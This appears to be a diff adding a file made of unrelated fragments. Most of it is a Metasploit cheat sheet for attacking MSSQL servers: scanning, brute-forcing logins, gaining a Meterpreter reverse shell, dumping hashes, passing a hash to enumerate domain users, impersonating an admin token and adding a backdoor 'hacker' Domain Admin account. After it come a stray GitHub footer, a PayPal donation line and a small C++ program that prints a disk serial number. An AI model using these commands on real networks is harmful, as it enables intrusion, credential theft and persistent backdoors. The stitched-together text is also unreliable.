@@ -1,0 +1,69 @@
+[+] Attacking MSSQL with Metasploit
+
+[>] Enumerate MSSQL Servers on the network:
+
+msf > use auxiliary/scanner/mssql/mssql_ping
+nmap -sU --script=ms-sql-info 192.168.1.108 192.168.1.156
+Discover more servers using "Browse for More" via Microsoft SQL Server Management Studio.
+
+[>] Bruteforce MSSQL Database:
+
+msf auxiliary(mssql_login) > use auxiliary/scanner/mssql/mssql_login
+
+[>] Enumerate MSSQL Database:
+
+msf > use auxiliary/admin/mssql/mssql_enum
+
+[>] Gain shell using gathered credentials
+
+msf > use exploit/windows/mssql/mssql_payload
+msf exploit(mssql_payload) > set PAYLOAD windows/meterpreter/reverse_tcp
+[+] After compromising a Windows machine:
+
+[>] List the domain administrators:
+From Shell - net group "Domain Admins" /domain
+
+[>] Dump the hashes (Metasploit)
+msf > run post/windows/gather/smart_hashdump GETSYSTEM=FALSE
+
+[>] Find the admins (Metasploit)
+spool /tmp/enumdomainusers.txt
+msf > use auxiliary/scanner/smb/smb_enumusers_domain
+msf > set smbuser Administrator
+msf > set smbpass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+msf > set rhosts 10.10.10.0/24
+msf > set threads 8
+msf > run
+
+msf> spool off
+
+[>] Compromise Admin's box
+meterpreter > load incognito
+meterpreter > list_tokens -u
+meterpreter > impersonate_token MYDOM\\adaministrator
+meterpreter > getuid
+meterpreter > shell
+
+C:\> whoami
+mydom\adaministrator
+C:\> net user hacker /add /domain
+C:\> net group "Domain Admins" hacker /add /domain
+© 2021 GitHub, Inc.
+Terms
+Privacy
+Security
+atreon: cheatengine
+custom: https://www.paypal.com/xclick/business=dark_byte%40hotmail.com&no_note=1&tax=0&lc=US
+#include "stdafx.h"
+
+
+int main()
+{
+	using std::cout;
+	DWORD dwVolumeSerialNumber;
+	GetVolumeInformation(NULL, NULL, NULL, &dwVolumeSerialNumber, NULL, NULL, NULL, NULL);//get HDD Serial Number
+	std::string HDDserial = std::to_string(dwVolumeSerialNumber);//put the serial number in a string
+	std:cout << "Here is Your HWID SKID!: " << HDDserial << std::endl;//print the string
+	while (true) {}//this is stupid but is the only way to keep the console open oof
+    return 0;
+}
